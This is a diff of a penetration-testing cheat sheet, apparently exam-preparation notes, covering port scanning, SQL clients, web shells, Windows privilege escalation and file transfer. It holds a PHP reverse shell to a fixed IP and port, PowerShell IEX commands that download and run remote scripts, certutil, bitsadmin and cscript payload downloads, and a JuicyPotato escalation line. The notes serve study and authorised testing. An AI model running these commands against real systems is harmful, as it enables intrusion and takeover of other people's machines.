@@ -2,8 +2,9 @@
 
 Network - Nmap
 ```
-$ nmap -v -sSV -p [port1, port2] -Pn [host] -oN [filename]   # verbose, syn-stealth, svc versions, target ports, no-ping,
-$ nmap -v -sUV -p [port1, port2] -Pn [host] -oN [filename]   # UDP
+$ nmap -v -A [host]  # verbose, syn-stealth, svc versions, target ports, no-ping,
+$ nmap -v -p- [host] # TCP all ports
+$ nmap -v -sU [host] # UDP
 ```
 
 Web - Gobuster
@@ -55,10 +56,10 @@ $ python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py -db volume -wi
 $ sqsh -S <IP> -U <Username> -P <Password> -D <Database>
 ```
 
+## Shells
 
-## Initial Exploitation
-
-### Shells
+Tricks
+* Try to URL encode payload if exploit is not working in webapp.
 
 Web shell + SMB exec
 ```
@@ -74,9 +75,14 @@ Have a web shell? Check if server can reach you
 $ sudo tcpdump -i tun0 -n icmp -v
 ```
 
-Execute PowerShell script non-interactively
+Exec PowerShell script non-interactively
 ```
-$ powershell -executionpolicy bypass ".\rshell.ps1 arg1 arg2"
+cmd> powershell -executionpolicy bypass ".\rshell.ps1 arg1 arg2"
+```
+
+Exec remote Powershell script
+```
+PS> IEX (New-Object System.Net.WebClient).DownloadString('http://[kali]/[script].ps1')
 ```
 
 Bypass PHP disable functions
@@ -84,22 +90,47 @@ Bypass PHP disable functions
 <?php shell_exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.0.5/4444 0>&1'"); ?>
 ```
 
-
 ## Linux Privilege Escalation
 
 
 ## Windows Privilege Escalation
 
-### Service Permissions
+## Tips
 
+Ensure architecture of your PS shell = architecture of PS payload.
+* Check if PS shell is 64bit `[Environment]::Is64BitProcess`
+
+## OS Vulnerabilities
+
+Windows Privesc Checker
+```
+$ python3 windows_exploit_suggester.py --update
+$ python3 windows_exploit_suggester.py --database 2021-10-27-mssb.xls --systeminfo systeminfo.out
+```
+
+Sherlock.ps1
+1. Copy local `sherlock.ps1` file to remote.
+2. Run `cmd> powershell -executionpolicy bypass ".\sherlock.ps1"`.
+
+
+### Insecure Service Permissions
+
+STEP 1: Check service permissions
 ```
 # windows/winXP
-> icacls/cacls [fullpath/to/service]
+cmd> icacls/cacls [fullpath/to/service]
 
 # powershell
 PS> Get-Acl
 PS> Get-ChildItem | Get-Acl
 ```
+
+STEP 2: Replace service binary with malicious binary and restart service.
+```
+cmd> sc qc [servicename] restart
+```
+
+
 
 ### File & Folder Permissions
 
@@ -110,8 +141,8 @@ https://www.notion.so/CHEATSHEET-ef447ed5ffb746248fec7528627c0405#5cedd479d1c142
 
 JuicyPotato - `SeImpersonatePrivilege` or `SeAssignPrimaryPrivilege` is enabled
 ```
-> whoami /privs
-> JuicyPotato.exe -p C:\inetpub\wwwroot\nc.bat -l 443 -t * -c
+cmd> whoami /privs
+cmd> JuicyPotato.exe -p C:\inetpub\wwwroot\nc.bat -l 443 -t * -c
 ```
 
 ## File Transfer Methods
@@ -124,7 +155,21 @@ JuicyPotato - `SeImpersonatePrivilege` or `SeAssignPrimaryPrivilege` is enabled
 
 Powershell
 ```
-> Powershell -c (New-Object Net.WebClient).DownloadFile('http://[host]:[port]/[file]', '[remotefile]')
+# Download file from remote to local
+cmd> Powershell -c (New-Object Net.WebClient).DownloadFile('http://[host]:[port]/[file]', '[file]')
+
+# Execute remote PS script
+PS> IEX (New-Object System.Net.WebClient).DownloadString('http://[kali]/[script].ps1')
+```
+
+Certutil
+```
+cmd> certutil.exe -urlcache -split -f http://[kali]/[src_file]
+```
+
+Bitsadmin
+```
+cmd> bitsadmin /transfer badthings http://[kali]:[port]/[src_file] [dest_file]
 ```
 
 Wget -> cscript
@@ -156,13 +201,18 @@ echo Next >> wget.vbs
 echo ts.Close >> wget.vbs
 
 # After you've created wget.vbs
-cscript wget.vbs http://[host]/evil.exe evil.exe
+cmd> cscript wget.vbs http://[host]/evil.exe evil.exe
 ```
 
 SMB
 ```
-> python3 /usr/share/doc/python3-impacket/examples/smbserver.py [sharename] [/path/to/share]  # setup local share
-> XXX
+# Kali - host SMB share
+$ python3 /usr/share/doc/python3-impacket/examples/smbserver.py [sharename] [/path/to/share]  # setup local share
+
+# Target - connect to share
+cmd> net view \\[kali]              # view remote shares
+cmd> net use \\[kali]\[share]       # connect to share
+cmd> copy \\[kali]\[share]\[src_file] [/path/to/dest_file]  # copy file
 ```
 
 
